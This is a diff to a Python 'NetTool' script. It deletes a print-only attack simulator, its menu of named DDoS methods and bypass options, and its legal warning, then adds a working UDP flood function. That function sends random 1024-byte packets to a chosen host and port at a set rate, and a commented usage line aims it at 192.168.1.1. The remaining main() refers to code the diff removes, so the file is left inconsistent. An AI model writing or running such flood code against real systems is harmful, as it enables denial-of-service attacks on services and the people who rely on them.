@@ -232,74 +232,25 @@ def main():
         else:
             print("Network interface is required for packet capture")
 
-def simulate_attack(target, attack_type, duration, threads, port, options):
-    print(f"Simulating {attack_type} attack on {target}")
-    print(f"Duration: {duration} seconds")
-    print(f"Threads: {threads}")
-    print(f"Port: {port}")
-    
-    for option, value in options.items():
-        if value:
-            print(f"Option enabled: {option}")
-    
-    start_time = time.time()
-    while time.time() - start_time < duration:
-        print(f"Sending simulated {attack_type} packets... {random.randint(100, 1000)} packets sent")
-        time.sleep(1)
-    
-    print("Attack simulation completed")
+def ddos_sim(target, port, duration, rate):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1024)
+    timeout = time.time() + duration
+    sent = 0
 
-def main():
-    parser = argparse.ArgumentParser(description="NetTool - Advanced DDoS Simulation Tool (FOR EDUCATIONAL PURPOSES ONLY)")
-    parser.add_argument("target", help="Target IP or domain")
-    parser.add_argument("attack_type", choices=[
-        "get", "post", "ovh", "rhex", "stomp", "stress", "dyn", "downloader", "slow", "head", "null", "cookie", "pps", "even",
-        "gsb", "dgb", "avb", "bot", "apache", "xmlrpc", "cfb", "cfbuam", "bypass", "bomb", "killer", "tor",
-        "tcp", "udp", "syn", "cps", "icmp", "connection", "vse", "ts3", "fivem", "mem", "ntp", "mcbot",
-        "minecraft", "mcpe", "dns", "char", "cldap", "ard", "rdp"
-    ], help="Type of attack to simulate")
-    parser.add_argument("-d", "--duration", type=int, default=10, help="Attack duration in seconds")
-    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads to simulate")
-    parser.add_argument("-p", "--port", type=int, default=80, help="Target port number")
-    
-    # Advanced options
-    parser.add_argument("--spoof-ip", action="store_true", help="Simulate IP spoofing")
-    parser.add_argument("--botnet", action="store_true", help="Simulate attacks from multiple sources")
-    parser.add_argument("--ssl-exhaust", action="store_true", help="Simulate SSL/TLS renegotiation attacks")
-    parser.add_argument("--dns-amp", action="store_true", help="Simulate DNS amplification attacks")
-    parser.add_argument("--slowloris", action="store_true", help="Simulate Slowloris attacks")
-    parser.add_argument("--post-flood", action="store_true", help="Simulate HTTP POST flooding")
-    parser.add_argument("--cache-bust", action="store_true", help="Simulate cache busting techniques")
-    parser.add_argument("--user-agent", action="store_true", help="Rotate user agents to mimic various browsers/devices")
-    parser.add_argument("--tor-network", action="store_true", help="Simulate using Tor network for anonymity")
-    parser.add_argument("--ddos-guard-bypass", action="store_true", help="Simulate DDoS-Guard bypass techniques")
-    parser.add_argument("--cloudflare-bypass", action="store_true", help="Simulate CloudFlare bypass techniques")
-    parser.add_argument("--wordpress-xmlrpc", action="store_true", help="Simulate WordPress XMLRPC exploitation")
-    parser.add_argument("--amplification", action="store_true", help="Simulate various amplification attacks")
+    while time.time() < timeout:
+        try:
+            client.sendto(bytes, (target, port))
+            sent += 1
+            if sent % rate == 0:
+                time.sleep(1)  # Adjust timing to maintain rate
+        except Exception as e:
+            print(f"Error: {e}")
 
-    args = parser.parse_args()
+    print(f"Sent {sent} packets to {target}:{port}")
 
-    print("WARNING: This tool is for educational and authorized testing purposes only.")
-    print("         Actual use of DDoS attacks or bypass techniques is illegal and unethical.")
-    print()
-
-    advanced_options = {
-        "IP Spoofing": args.spoof_ip,
-        "Botnet Simulation": args.botnet,
-        "SSL/TLS Exhaustion": args.ssl_exhaust,
-        "DNS Amplification": args.dns_amp,
-        "Slowloris": args.slowloris,
-        "POST Flooding": args.post_flood,
-        "Cache Busting": args.cache_bust,
-        "User Agent Rotation": args.user_agent,
-        "Tor Network Simulation": args.tor_network,
-        "DDoS-Guard Bypass": args.ddos_guard_bypass,
-        "CloudFlare Bypass": args.cloudflare_bypass,
-        "WordPress XMLRPC Exploit": args.wordpress_xmlrpc,
-        "Amplification Attacks": args.amplification
-    }
-
-    simulate_attack(args.target, args.attack_type, args.duration, args.threads, args.port, advanced_options)
+# Usage example
+# ddos_sim("192.168.1.1", 80, 10, 1000)  # 10 seconds at 1000 packets/sec
 
 if __name__ == "__main__":
     main()
